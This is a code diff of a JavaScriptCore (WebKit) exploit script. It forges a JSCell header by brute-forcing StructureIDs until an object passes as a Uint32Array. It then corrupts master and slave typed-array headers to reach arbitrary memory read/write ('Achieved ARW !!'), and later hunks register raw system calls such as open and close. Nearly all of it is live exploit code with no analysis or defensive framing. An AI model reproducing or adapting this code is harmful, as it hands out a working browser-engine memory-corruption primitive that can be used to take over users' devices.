@@ -94,19 +94,18 @@ for (var i = 0; i < u32_structs.length; i++) {
 
 var js_cell = new BigInt()
 var length_and_flags = new BigInt(1, 0x30)
-var rw_obj = { js_cell: 0, butterfly: null, vector: slave, length_and_flags: length_and_flags.d() }
+var rw_obj = { js_cell: js_cell.d(), butterfly: null, vector: slave, length_and_flags: length_and_flags.d() }
 
 // try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
 var structure_id = 0x80
 while (!(master instanceof Uint32Array)) {
-  js_cell = new BigInt()
-
-  js_cell.u32[0] = structure_id++ // StructureID
-
-  js_cell.u8[4] = 0x00 // IndexingType::NonArray
-  js_cell.u8[5] = 0x23 // JSType::Uint32ArrayType
-  js_cell.u8[6] = 0xE0 // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
-  js_cell.u8[7] = 0x01 // CellType::DefinitelyWhite
+  js_cell = new BigInt(
+      0x00 // IndexingType::NonArray
+    | 0x23 << 8 // JSType::Uint32ArrayType
+    | 0xE0 << 16 // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
+    | 0x01 << 24, // CellType::DefinitelyWhite
+    structure_id++ // StructureID
+  )
 
   rw_obj.js_cell = js_cell.jsv()
 
@@ -122,10 +121,9 @@ while (!(master instanceof Uint32Array)) {
 }
 
 slave_addr = mem.addrof(slave)
-slave_buf_addr = mem.view(slave_addr).getBigInt(0x20, true)
 
 // Fix master
-mem.view(master_addr).setBigInt(8, BigInt.Zero, true)
+mem.view(master_addr).setBigInt(8, 0, true)
 mem.view(master_addr).setBigInt(0x18, length_and_flags, true)
 
 // Fix slave
@@ -133,6 +131,7 @@ mem.view(slave_addr).setUint8(6, 0xA0) // TypeInfo::InlineTypeFlags::OverridesGe
 mem.view(slave_addr).setInt32(0x18, -1, true)
 mem.view(slave_addr).setInt32(0x1C, 1, true)
 
+var slave_buf_addr = mem.view(slave_addr).getBigInt(0x20, true)
 mem.view(slave_buf_addr).setInt32(0x20, -1, true)
 
 log('Achieved ARW !!')
@@ -197,12 +196,3 @@ fn.register(0x5, 'open', 'bigint')
 fn.register(0x6, 'close', 'bigint')
 
 utils.notify('UwU')
-
-fn.register(0x87, 'socketpair', 'bigint')
-
-var pair = mem.malloc(8)
-
-fn.socketpair(1, 1, 0, pair)
-
-log(`pair[0]: ${mem.view(pair).getUint32(0, true)}`)
-log(`pair[1]: ${mem.view(pair).getUint32(4, true)}`)
